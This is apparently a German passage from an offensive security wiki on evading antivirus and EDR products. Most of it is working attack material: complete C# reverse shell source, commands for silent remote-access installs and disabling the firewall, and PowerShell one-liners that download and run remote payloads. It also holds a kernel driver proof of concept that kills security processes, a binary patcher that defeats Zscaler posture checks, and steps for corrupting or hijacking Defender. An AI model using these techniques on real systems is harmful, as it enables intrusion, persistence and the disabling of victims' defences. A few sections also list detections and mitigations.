Here is a Demo zum Umgehen von SmartScreen, indem Payloads in ISO-Dateien verpackt werden mit [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ist ein mächtiger Logging-Mechanismus in Windows, der es Anwendungen und Systemkomponenten erlaubt, **Ereignisse zu protokollieren**. Er kann jedoch auch von Security-Produkten genutzt werden, um bösartige Aktivitäten zu überwachen und zu erkennen.

Ähnlich wie bei der Deaktivierung (Umgehung) von AMSI ist es auch möglich, die Funktion **`EtwEventWrite`** des User-Space-Prozesses so zu verändern, dass sie sofort zurückkehrt, ohne Ereignisse zu protokollieren. Das wird erreicht, indem die Funktion im Speicher gepatcht wird, sodass sie sofort zurückkehrt und dadurch das ETW-Logging für diesen Prozess effektiv deaktiviert.

Weitere Informationen findest du in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

C#-Binaries direkt im Speicher zu laden ist schon seit einiger Zeit bekannt und ist weiterhin eine sehr gute Methode, um Post-Exploitation-Tools auszuführen, ohne von AV entdeckt zu werden.

Da das Payload direkt in den Speicher geladen wird, ohne die Festplatte zu berühren, müssen wir uns hauptsächlich darum kümmern, AMSI für den gesamten Prozess zu patchen.

Die meisten C2-Frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) bieten bereits die Möglichkeit, C#-Assemblies direkt im Speicher auszuführen, aber es gibt unterschiedliche Vorgehensweisen:

- **Fork\&Run**

Dabei wird ein **neuer „Opfer“-Prozess erzeugt**, dein post-exploitation bösartiger Code in diesen neuen Prozess injiziert, der bösartige Code ausgeführt und nach Beendigung der neue Prozess beendet. Das hat sowohl Vorteile als auch Nachteile. Der Vorteil der Fork-and-Run-Methode ist, dass die Ausführung **außerhalb** unseres Beacon-Implantat-Prozesses stattfindet. Das bedeutet, dass falls bei unserer Post-Exploitation-Aktion etwas schiefgeht oder entdeckt wird, die **Wahrscheinlichkeit wesentlich höher** ist, dass unser **Implantat überlebt.** Der Nachteil ist, dass die Chance, durch **Behavioural Detections** entdeckt zu werden, **größer** ist.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dabei wird der post-exploitation bösartige Code **in den eigenen Prozess** injiziert. So vermeidest du das Erstellen eines neuen Prozesses und dessen Scan durch AV, aber der Nachteil ist, dass, wenn bei der Ausführung deines Payloads etwas schiefgeht, die **Wahrscheinlichkeit deutlich höher** ist, deinen **Beacon zu verlieren**, da dieser abstürzen könnte.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Wenn du mehr über das Laden von C#-Assemblies lesen möchtest, schau dir diesen Artikel an [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und deren InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Du kannst C#-Assemblies auch **aus PowerShell** laden, siehe [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Verwendung anderer Programmiersprachen

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, ist es möglich, bösartigen Code mit anderen Sprachen auszuführen, indem man der kompromittierten Maschine Zugriff auf die Interpreter-Umgebung auf dem vom Angreifer kontrollierten SMB-Share gewährt.

Indem man Zugriff auf die Interpreter-Binaries und die Umgebung auf dem SMB-Share erlaubt, kann man **beliebigen Code in diesen Sprachen im Speicher** der kompromittierten Maschine ausführen.

Das Repo weist darauf hin: Defender scannt weiterhin die Skripte, aber durch die Nutzung von Go, Java, PHP etc. hat man **mehr Flexibilität, um statische Signaturen zu umgehen**. Tests mit zufälligen, nicht obfuskierten Reverse-Shell-Skripten in diesen Sprachen waren erfolgreich.

## TokenStomping

Token stomping ist eine Technik, die einem Angreifer erlaubt, **ein Zugriffstoken oder ein Sicherheitsprodukt wie ein EDR oder AV zu manipulieren**, sodass dessen Rechte reduziert werden — der Prozess stirbt nicht, hat aber nicht mehr die Berechtigungen, nach bösartigen Aktivitäten zu suchen.

Um dies zu verhindern, könnte Windows **testen, dass externe Prozesse** keine Handles über die Tokens von Sicherheitsprozessen erhalten.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Wie in [**diesem Blogpost**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) beschrieben, ist es einfach, Chrome Remote Desktop auf dem PC eines Opfers zu installieren und es dann zur Übernahme und Persistenznutzung zu verwenden:
1. Von https://remotedesktop.google.com/ herunterladen, auf "Set up via SSH" klicken und dann die MSI-Datei für Windows herunterladen.
2. Den Installer im Opferrechner still im Hintergrund ausführen (Admin erforderlich): `msiexec /i chromeremotedesktophost.msi /qn`
3. Zurück zur Chrome Remote Desktop-Seite gehen und auf Weiter klicken. Der Assistent wird dich zur Autorisierung auffordern; klicke auf den Authorize-Button, um fortzufahren.
4. Führe den angegebenen Parameter mit einigen Anpassungen aus: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Beachte den pin-Parameter, mit dem sich die PIN setzen lässt, ohne die GUI zu verwenden).


## Erweiterte Evasion

Evasion ist ein sehr komplexes Thema; manchmal muss man viele verschiedene Telemetriequellen in nur einem System berücksichtigen, sodass es nahezu unmöglich ist, in reifen Umgebungen komplett unentdeckt zu bleiben.

Jede Umgebung, gegen die du vorgehst, hat ihre eigenen Stärken und Schwächen.

Ich empfehle dringend, diesen Talk von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einstieg in fortgeschrittene Evasion-Techniken zu bekommen.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Das ist auch ein weiterer großartiger Talk von [@mariuszbit](https://twitter.com/mariuszbit) über Evasion in der Tiefe.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Alte Techniken**

### **Prüfen, welche Teile Defender als bösartig erkennt**

Du kannst [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden, das **Teile der Binary entfernt**, bis es **herausfindet, welchen Teil Defender** als bösartig identifiziert und ihn dir aufteilt.\
Ein weiteres Tool, das **das Gleiche macht, ist** [**avred**](https://github.com/dobin/avred) mit einem offenen Web-Service unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Bis Windows 10 wurde allen Windows-Versionen ein **Telnet-Server** mitgeliefert, den man (als Administrator) installieren konnte, indem man:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Beim Systemstart **starten** lassen und jetzt **ausführen**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Ändere telnet port** (stealth) und deaktiviere die firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Herunterladen von: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (du willst die bin-Downloads, nicht das Setup)

**AUF DEM HOST**: Führe _**winvnc.exe**_ aus und konfiguriere den Server:

- Aktiviere die Option _Disable TrayIcon_
- Setze ein Passwort in _VNC Password_
- Setze ein Passwort in _View-Only Password_

Verschiebe dann das Binary _**winvnc.exe**_ und die **neu** erstellte Datei _**UltraVNC.ini**_ auf die **victim**

#### **Reverse connection**

Der **attacker** sollte auf seinem **host** das Binary `vncviewer.exe -listen 5900` ausführen, damit es vorbereitet ist, eine reverse **VNC connection** abzufangen. Dann, auf der **victim**: Starte den winvnc-Daemon `winvnc.exe -run` und führe `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` aus

**WARNUNG:** Um unentdeckt zu bleiben, darfst du einige Dinge nicht tun

- Starte `winvnc` nicht, wenn es bereits läuft, sonst löst du ein [popup](https://i.imgur.com/1SROTTl.png) aus. Prüfe, ob es läuft mit `tasklist | findstr winvnc`
- Starte `winvnc` nicht ohne `UltraVNC.ini` im gleichen Verzeichnis, sonst öffnet sich [das Konfigurationsfenster](https://i.imgur.com/rfMQWcf.png)
- Führe nicht `winvnc -h` zur Hilfe aus, sonst löst du ein [popup](https://i.imgur.com/oc18wcu.png) aus

### GreatSCT

Herunterladen von: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Innerhalb von GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Jetzt **starte den Lister** mit `msfconsole -r file.rc` und **führe** das **xml payload** mit folgendem Befehl aus:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Der aktuelle Defender wird den Prozess sehr schnell beenden.**

### Unseren eigenen reverse shell kompilieren

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erste C# Revershell

Kompiliere es mit:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Verwende es mit:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und Ausführung:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste der C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Verwendung von Python zum Erstellen von Injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Weitere Tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mehr

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 nutzte ein kleines Konsolenprogramm namens **Antivirus Terminator**, um Endpoint-Schutzmaßnahmen zu deaktivieren, bevor Ransomware abgelegt wurde. Das Tool bringt seinen **eigenen verwundbaren, aber *signierten* Treiber** mit und missbraucht ihn, um privilegierte Kernel-Operationen auszuführen, die selbst Protected-Process-Light (PPL) AV-Dienste nicht blockieren können.

Wichtige Erkenntnisse
1. **Signed driver**: Die auf die Festplatte geschriebene Datei ist `ServiceMouse.sys`, aber die Binärdatei ist der rechtmäßig signierte Treiber `AToolsKrnl64.sys` aus Antiy Labs’ “System In-Depth Analysis Toolkit”. Da der Treiber eine gültige Microsoft-Signatur trägt, wird er geladen, selbst wenn Driver-Signature-Enforcement (DSE) aktiviert ist.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die erste Zeile registriert den Treiber als **Kernel-Service** und die zweite startet ihn, sodass `\\.\ServiceMouse` aus dem Benutzermodus zugänglich wird.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Beendet einen beliebigen Prozess per PID (zum Beenden von Defender/EDR-Diensten verwendet) |
| `0x990000D0` | Löscht eine beliebige Datei auf der Festplatte |
| `0x990001D0` | Entlädt den Treiber und entfernt den Service |

Minimales C-Proof-of-Concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD umgeht vollständig die Schutzmechanismen im Benutzermodus; Code, der im Kernel ausgeführt wird, kann *geschützte* Prozesse öffnen, diese beenden oder Kernel-Objekte manipulieren, unabhängig von PPL/PP, ELAM oder anderen Härtungsmaßnahmen.

Erkennung / Gegenmaßnahmen
•  Aktivieren Sie Microsofts Blockliste für verwundbare Treiber (`HVCI`, `Smart App Control`), damit Windows das Laden von `AToolsKrnl64.sys` verweigert.  
•  Überwachen Sie die Erstellung neuer *Kernel*-Dienste und alarmieren Sie, wenn ein Treiber aus einem für alle beschreibbaren Verzeichnis geladen wird oder nicht auf der Allow-Liste steht.  
•  Beobachten Sie Handles im Benutzermodus zu benutzerdefinierten Device-Objekten, gefolgt von verdächtigen `DeviceIoControl`-Aufrufen.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Der **Client Connector** von Zscaler wendet Geräte-Posture-Regeln lokal an und verwendet Windows RPC, um die Ergebnisse an andere Komponenten zu übermitteln. Zwei schwache Designentscheidungen ermöglichen eine vollständige Umgehung:

1. Die Posture-Bewertung erfolgt **vollständig clientseitig** (es wird ein Boolescher Wert an den Server gesendet).
2. Interne RPC-Endpunkte prüfen nur, ob die verbindende ausführbare Datei **von Zscaler signiert** ist (mittels `WinVerifyTrust`).

Durch das **Patchen von vier signierten Binärdateien auf der Festplatte** können beide Mechanismen neutralisiert werden:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gibt immer `1` zurück, sodass jede Prüfung als konform gilt |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ jeder (auch nicht signierte) Prozess kann sich an die RPC-Pipes binden |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Kurzgeschlossen |

Minimaler Auszug des Patchers:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nach dem Ersetzen der Originaldateien und dem Neustart des Service-Stacks:

* **Alle** Posture-Checks zeigen **grün/konform** an.
* Nicht-signierte oder veränderte Binärdateien können die named-pipe RPC-Endpunkte öffnen (z. B. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Der kompromittierte Host erhält uneingeschränkten Zugriff auf das interne Netzwerk, das durch die Zscaler-Richtlinien definiert ist.

Diese Fallstudie zeigt, wie rein clientseitige Vertrauensentscheidungen und einfache Signaturprüfungen mit ein paar Byte-Patches umgangen werden können.

## Missbrauch von Protected Process Light (PPL) zur Manipulation von AV/EDR mit LOLBINs

Protected Process Light (PPL) erzwingt eine Signer/Level-Hierarchie, sodass nur gleich- oder höherstufige protected processes einander manipulieren können. Offensiv: Wenn man eine PPL-fähige Binary legal starten und deren Argumente kontrollieren kann, lässt sich harmlose Funktionalität (z. B. Logging) in ein eingeschränktes, von PPL unterstütztes write-primitive gegen geschützte Verzeichnisse wandeln, die von AV/EDR verwendet werden.

Wodurch läuft ein Prozess als PPL
- Die Ziel-EXE (und alle geladenen DLLs) müssen mit einem PPL-fähigen EKU signiert sein.
- Der Prozess muss mit CreateProcess erstellt werden und die Flags verwenden: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Es muss ein kompatibles protection level angefordert werden, das zum Signer der Binary passt (z. B. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` für Anti-Malware-Signer, `PROTECTION_LEVEL_WINDOWS` für Windows-Signer). Falsche Levels führen zum Fehlschlag bei der Erstellung.

Siehe auch eine ausführlichere Einführung zu PP/PPL und LSASS-Schutz hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher-Tools
- Open-Source-Helfer: CreateProcessAsPPL (wählt den protection level aus und leitet Argumente an die Ziel-EXE weiter):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Verwendungsmuster:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Die signierte System-Binärdatei `C:\Windows\System32\ClipUp.exe` erzeugt Prozesse von sich aus und akzeptiert einen Parameter, um eine Logdatei in einen vom Aufrufer angegebenen Pfad zu schreiben.
- Wenn sie als PPL-Prozess gestartet wird, erfolgt der Dateischreibvorgang mit PPL-Unterstützung.
- ClipUp kann Pfade mit Leerzeichen nicht verarbeiten; verwende 8.3-Kurzpfade, um in normalerweise geschützte Orte zu zeigen.

8.3-Kurzpfad-Hilfen
- Kurznamen auflisten: `dir /x` in jedem übergeordneten Verzeichnis.
- Kurzpfad in cmd ermitteln: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Missbrauchskette (abstrakt)
1) Starte den PPL-fähigen LOLBIN (ClipUp) mit `CREATE_PROTECTED_PROCESS` über einen Launcher (z. B. CreateProcessAsPPL).
2) Übergebe das ClipUp-Logpfad-Argument, um die Erstellung einer Datei in einem geschützten AV-Verzeichnis zu erzwingen (z. B. Defender Platform). Verwende ggf. 8.3-Kurzpfade.
3) Wenn die Ziel-Binärdatei normalerweise offen/gesperrt ist, während die AV läuft (z. B. MsMpEng.exe), plane den Schreibvorgang beim Booten, bevor die AV startet, indem du einen Auto-Start-Service installierst, der zuverlässig früher ausgeführt wird. Überprüfe die Boot-Reihenfolge mit Process Monitor (Boot-Logging).
4) Beim Reboot erfolgt der PPL-unterstützte Schreibvorgang, bevor die AV ihre Binärdateien sperrt, wodurch die Zieldatei beschädigt wird und ein Start verhindert wird.

Beispielaufruf (Pfade aus Sicherheitsgründen ausgeblendet/gekürzt):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Hinweise und Einschränkungen
- Sie können den Inhalt, den ClipUp schreibt, außer dem Speicherort nicht kontrollieren; die Primitive eignet sich eher für Korruption als für präzise Inhaltseinfügungen.
- Erfordert lokalen Admin/SYSTEM, um einen Service zu installieren/starten und ein Zeitfenster für einen Neustart.
- Timing ist kritisch: das Ziel darf nicht geöffnet sein; Ausführung zur Boot-Zeit vermeidet Dateisperren.

Erkennungen
- Prozess-Erstellung von `ClipUp.exe` mit ungewöhnlichen Argumenten, insbesondere wenn der Parent durch nicht-standardmäßige Launcher erfolgt, rund um den Boot.
- Neue Services, die so konfiguriert sind, dass verdächtige Binaries automatisch starten und konsistent vor Defender/AV starten. Untersuchen Sie Service-Erstellung/-Änderung vor Defender-Startup-Fehlern.
- Dateiintegritätsüberwachung auf Defender-Binaries/Platform-Verzeichnissen; unerwartete Dateierstellungen/-änderungen durch Prozesse mit protected-process-Flags.
- ETW/EDR-Telemetrie: nach Prozessen suchen, die mit `CREATE_PROTECTED_PROCESS` erstellt wurden, und anomaler PPL-Level-Nutzung durch Nicht-AV-Binaries.

Gegenmaßnahmen
- WDAC/Code Integrity: einschränken, welche signierten Binaries als PPL laufen dürfen und unter welchen Parent-Prozessen; ClipUp-Aufrufe außerhalb legitimer Kontexte blockieren.
- Service-Hygiene: Beschränken der Erstellung/Änderung von Auto-Start-Services und Überwachen von Manipulationen der Startreihenfolge.
- Stellen Sie sicher, dass Defender-Manipulationsschutz und Early-Launch-Schutz aktiviert sind; untersuchen Sie Startup-Fehler, die auf Binärdateikorruption hinweisen.
- Erwägen Sie, die 8.3-Kurznamensgenerierung auf Volumes zu deaktivieren, die Sicherheits-Tools hosten, sofern dies mit Ihrer Umgebung kompatibel ist (gründlich testen).

Quellen für PPL und Tools
- Microsoft Protected Processes Übersicht: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU-Referenz: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon Boot-Logging (Reihenfolge-Validierung): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL-Launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technikbeschreibung (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Manipulation von Microsoft Defender durch Symlink-Hijack des Platform-Version-Ordners

Windows Defender wählt die Plattform, aus der es ausgeführt wird, indem es die Unterordner unter:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

aufzählt. Es wählt den Unterordner mit der höchsten lexikographischen Versionszeichenfolge (z. B. `4.18.25070.5-0`) und startet dann die Defender-Serviceprozesse von dort (aktualisiert entsprechend die Service-/Registry-Pfade). Bei dieser Auswahl werden Verzeichniseinträgen, einschließlich Reparse-Punkten (Symlinks), vertraut. Ein Administrator kann dies ausnutzen, um Defender auf einen vom Angreifer beschreibbaren Pfad umzuleiten und so DLL-Sideloading oder Dienststörungen zu erreichen.

Voraussetzungen
- Lokaler Administrator (erforderlich, um Verzeichnisse/Symlinks unter dem Platform-Ordner zu erstellen)
- Möglichkeit, neu zu starten oder eine Neuauswahl der Defender-Plattform auszulösen (Service-Neustart beim Boot)
- Es werden nur integrierte Tools benötigt (mklink)

Warum es funktioniert
- Defender blockiert Schreibzugriffe in seinen eigenen Ordnern, aber seine Plattformauswahl vertraut Verzeichniseinträgen und wählt die lexikographisch höchste Version, ohne zu prüfen, ob das Ziel auf einen geschützten/vertrauenswürdigen Pfad aufgelöst wird.

Schritt-für-Schritt (Beispiel)
1) Erstellen Sie eine beschreibbare Kopie des aktuellen Platform-Ordners, z. B. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Erstelle innerhalb von Platform einen Verzeichnis-Symlink mit höherer Version, der auf deinen Ordner zeigt:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Auswahl des Triggers (Neustart empfohlen):
```cmd
shutdown /r /t 0
```
4) Überprüfen Sie, dass MsMpEng.exe (WinDefend) aus dem umgeleiteten Pfad ausgeführt wird:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Sie sollten den neuen Prozesspfad unter `C:\TMP\AV\` sowie die Service-Konfiguration/Registry sehen, die diesen Speicherort widerspiegelt.

Post-exploitation-Optionen
- DLL sideloading/code execution: DLLs ablegen/ersetzen, die Defender aus seinem Anwendungsverzeichnis lädt, um Code in den Defender-Prozessen auszuführen. Siehe den Abschnitt oben: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Entfernen Sie den version-symlink, sodass beim nächsten Start der konfigurierte Pfad nicht aufgelöst wird und Defender nicht startet:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Beachte, dass diese Technik für sich genommen keine Privilegieneskalation bietet; sie erfordert Administratorrechte.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

